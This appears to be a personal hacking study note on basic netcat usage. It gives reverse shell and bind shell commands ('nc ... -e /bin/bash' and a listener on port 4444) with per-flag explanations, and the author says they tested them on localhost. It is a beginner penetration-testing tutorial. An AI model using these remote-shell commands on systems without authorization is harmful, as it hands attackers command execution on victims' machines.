# Hacking Study Notes - Netcat Basic Usage

Netcat is a networking utility that creates network connections using TCP or UDP and allows data to be sent and received.

In plain terms — a tool that lets you transfer files over a network or interact with other computers.

Netcat requires no complex syntax, is intuitive, and covers everything from initial recon to data exfiltration, making it an essential tool for penetration testers.

Today I'll walk through basic netcat usage with some hands-on practice.

Netcat supports various connection modes, including a bind shell (attacker connects to target) and a reverse shell (target connects back to attacker).

(For a basic explanation of shells: https://unknown08.tistory.com/36)

Important: the order of commands differs between reverse shell and bind shell.

```bash
### Reverse Shell

# Attacker shell command (run first)
nc -lvnp 4444
# -l: listen mode, wait for incoming connection
# -v: verbose output (connection info)
# -n: skip DNS lookup (faster)
# -p: specify port (4444)

# Target shell command
nc 192.168.1.50 4444 -e /bin/bash
# 192.168.1.50: attacker's IP address (use localhost for local testing)
# 4444: port to connect to
# -e /bin/bash: send your bash shell to the attacker

### Bind Shell

# Target shell command (run first)
nc -lvnp 4444 -e /bin/bash
# -l: listen mode
# -v: verbose output
# -n: skip DNS lookup
# -p: specify port (4444)
# -e /bin/bash: provide bash shell

# Attacker shell command
nc 192.168.1.50 4444
# 192.168.1.50: target's IP address
# 4444: port to connect to
```

※ Tested in a local environment, so localhost was used instead of an actual IP.

Once you enter the commands, you'll see a connection message like this (reverse shell):

![1](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Hacking%20Study%20Notes/Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage/1.Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage.png)

With a reverse shell established, you can run shell commands on the target machine — things like `whoami` or `ls`.

![2](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Hacking%20Study%20Notes/Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage/2.Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage.png)

With a bind shell, the connection message appears on the target side instead:

![3](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Hacking%20Study%20Notes/Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage/3.Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage.png)

Just like the reverse shell, you can run commands like `whoami` and `ls`:

![4](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Hacking%20Study%20Notes/Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage/4.Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage.png)

That wraps up basic netcat usage. Next up: real-world advanced techniques.
